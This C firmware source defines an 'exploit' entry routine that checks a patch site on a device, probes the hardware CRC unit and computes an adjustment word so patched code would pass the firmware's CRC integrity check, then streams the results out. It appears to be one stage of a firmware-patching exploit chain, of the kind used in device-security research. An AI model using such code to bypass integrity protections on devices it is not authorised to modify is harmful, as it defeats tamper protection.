#define CRC_PAYLOAD 1
#define CRC_PROBE_PAYLOAD 1
#include "patch_common.h"
#include "crc_runtime.h"

void exploit(void) __attribute__((section(".text.entry"),used,noreturn));
void exploit(void) {
  struct runtime_guard guard;
  uint32_t values[PROTO_CRC_RECORD_COUNT];
  uint32_t entry_ctl;
  uint32_t entry_cout;
  uint32_t prefix_crc;
  uint32_t new_adjust;

  __asm__ volatile ("di");
  runtime_begin(&guard);
  if (MMIO32(PATCH_ADDRESS - 2u) != ORIGINAL_INSTRUCTION_WORD) {
    halt_crc_error(PROTO_OP_CRC_PROBE, 1u, MMIO32(PATCH_ADDRESS - 2u), &guard);
  }

  capture_dcra(&entry_ctl, &entry_cout);
  if ((entry_ctl & 3u) != 0u) {
    halt_crc_error(PROTO_OP_CRC_PROBE, 2u, entry_ctl, &guard);
  }
  prefix_crc = crc_prefix_sw(1u, &guard);
  new_adjust = crc_adjustment(prefix_crc);

  values[PROTO_CRC_ENTRY_CTL] = entry_ctl;
  values[PROTO_CRC_ENTRY_COUT] = entry_cout;
  values[PROTO_CRC_RANGE_START] = CRC_RANGE_START;
  values[PROTO_CRC_RANGE_END] = CRC_RANGE_END;
  values[PROTO_CRC_ADJUST_ADDRESS] = CRC_ADJUST;
  values[PROTO_CRC_OLD_ADJUST_WORD] = MMIO32(CRC_ADJUST);
  values[PROTO_CRC_PATCHED_PREFIX_SW] = prefix_crc;
  values[PROTO_CRC_NEW_ADJUST_WORD] = new_adjust;
  values[PROTO_CRC_ORIGINAL_SW_FULL] = crc_full_sw(0u, 0u, &guard);
  values[PROTO_CRC_PATCHED_SW_FULL] = crc_full_sw(1u, new_adjust, &guard);
  values[PROTO_CRC_ORIGINAL_DCRA_RAW] = dcra_full_raw(0u, 0u, &guard);
  values[PROTO_CRC_PATCHED_DCRA_RAW] = dcra_full_raw(1u, new_adjust, &guard);

  if (restore_dcra(entry_ctl, entry_cout) != 0u) {
    halt_crc_error(PROTO_OP_CRC_PROBE, 3u, entry_ctl, &guard);
  }
  values[PROTO_CRC_EXIT_CTL] = DCRA_CTL;
  values[PROTO_CRC_EXIT_COUT] = DCRA_COUT;
  values[PROTO_CRC_SRAM_ECHO_LENGTH] = 0u;
  values[PROTO_CRC_SRAM_ECHO_CRC32] = 0u;

  (void)send_crc_stream(PROTO_OP_CRC_PROBE, values, &guard);
  runtime_end(&guard);
  for (;;) {
  }
}
